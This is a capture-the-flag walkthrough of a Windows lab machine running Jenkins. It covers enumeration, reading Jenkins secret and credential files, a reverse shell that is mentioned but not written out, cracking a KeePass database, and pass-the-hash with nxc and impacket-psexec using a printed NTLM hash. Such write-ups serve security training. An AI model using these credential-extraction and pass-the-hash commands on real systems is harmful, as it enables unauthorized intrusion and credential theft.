#Pwned! 
```IP
10.10.10.63
```
# Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 10.10.10.63 -vvv -p- -oN enum/full
```
The output being:
```
PORT      STATE SERVICE      REASON          VERSION
80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

```
## HTTP 80
We get an image error everytime we search for something in the application. The error displays the MSQLS version: Microsoft SQL Server 2005 9.00.4053.00
Fuzzing directories doesn't seem to reveal anything interesting.
It seems to be patched against SQLi too.
## HTTP 50000
Jetty 9.4.z-SNAPSHOT
Apparently we can't do a path traversal attack, fuzzing directories proves useless until we try with seclist `directory-list-2.3-medium.txt` which finds `askjeeves` directory.
Ì tried to exploit it using https://github.com/jpiechowka/jenkins-cve-2016-0792.git but we get the following message:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241226094323.png?raw=true)
If we navigate to askjeeves we have the jenkins console where we can execute code with the build functionality
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241226094705.png?raw=true)
We can also see in the bottom right corner that it is jenkins version 2.87
More information
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241226095921.png?raw=true)
Apparently we can decrypt a password with the following code https://github.com/gquere/pwn_jenkins/tree/master if we have the following files:
```
type C:\Users\Administrator\.jenkins\users\admin\config.xml
type C:\Users\Administrator\.jenkins\secrets\master.key
type C:\Users\Administrator\.jenkins\secrets\hudson.util.Secret
```
The last file however will output odd characters. We will need to transform it into base64 in order to properly operate with it:
```
powershell.exe -c "$c=[convert]::ToBase64String((Get-Content -path 'C:\Users\Administrator\.jenkins\secrets\hudson.util.Secret' -Encoding byte));Write-Output $c"
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241226100901.png?raw=true)
```xml
<?xml version='1.0' encoding='UTF-8'?>
<user>
  <fullName>admin</fullName>
  <properties>
    <jenkins.security.ApiTokenProperty>
      <apiToken>{AQAAABAAAAAwID3cR3pyZaEkaDPU25Z0S+nrU8+gDgB0JEWORJ5L1P2T+zXc/tSs2IVn1ugWLaui54D6yYki4vhXQtGhqUSeFw==}</apiToken>
    </jenkins.security.ApiTokenProperty>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$QyIjgAFa7r3x8IMyqkeCluCB7ddvbR7wUn1GmFJNO2jQp2k8roehO</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <roles>
        <string>authenticated</string>
      </roles>
      <timestamp>1509762882255</timestamp>
    </jenkins.security.LastGrantedAuthoritiesProperty>
  </properties>
</user>
```

```key
40e19a08d55698273e82182aae560bb78f5c99205e1b603de13e4729dfeed0bfaa9ed79557107ca7294a8a18a9bd81d60ee5610943e488bf2150dc1b06935b8f2a4f5b9370e0cb1d28249758e2b96cf2b658f2c5290fc6a202d9a04621c79eb0d09faf3246e50998a0aaea42b76eb96186f4842e0f9c07bbbd77152afc59de16
```

```hudson.util.Secret
17YMaGax5EC5QaxvqhRSuurM7gVN//UqUuX1U8FJW2Np3qtsgvujgtBo/v1tXF/yGlXbB66bv86gYvl7eIxilj1CaWlQr07+TyNivEdQPf+UEmCbxeP2aqF4fs6HAiXZzDerWnsEafFDAJlD8pedi7AJy2pojaveZAQIYMhuthnnRpEZFEEaHze340TfNySncWCCPMGP1Xde7tgiitohjQeFjfRB3mJltOTMEwyBlNvojomte32a7t7luw1uPJpHgmbqe987pEL1haa/VRq1kUB8kBegvnCXSa8FmLBRcPKU1XNmROSAZhuiPaNeWESv67jzlJiiYl7bNaMY3I/iXJ8kTKa3iRK9obBN05xKCQI=
```
We get the following password:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241226102958.png?raw=true)
```
b979d8dc2568628f73c75157a2fec5ee
```

Doesn't seem to work. If we execute a simple powershell reverse shell encoded in base64 we get a connection. Apparently it was a far easier path:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241226103455.png?raw=true)
We get user.txt
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241226103628.png?raw=true)
Administrator does not seem to contain the flag root.txt.
We geta CEH.kdbx file though
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241226103939.png?raw=true)
we can transfer it copying to our workspace in jenkins
```
copy \users\kohsuke\documents\CEH.kdbx C:\Users\Administrator\.jenkins\workspace\test
```
And now we can download it in our local machine and extract the hash:
```
keepass2john /home/kali/Downloads/CEH.kdbx > CEH.hash
```
And we will try to crack it with
```
john --wordlist=/usr/share/wordlists/rockyou.txt CEH.hash
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241226111230.png?raw=true)
Now we can access the database:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241226111849.png?raw=true)
There is a password that seems like an NTLM hash:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241226111835.png?raw=true)
If we perform a pass the hash attack we will see that it works with administrator user:
```
nxc smb 10.10.10.63 -u administrator  -H aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241226112109.png?raw=true)
```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.10.10.63
```
We have now access as NT Authority System
And we can see in the administrator desktop a data stream file
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241226112551.png?raw=true)
Which we can read with
```
more < hm.txt:root.txt
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241226112748.png?raw=true)

# Exploitation

# PrivEsc

## Manual

## Automated

### Peass
### Mimikatz

# Lateral Movement

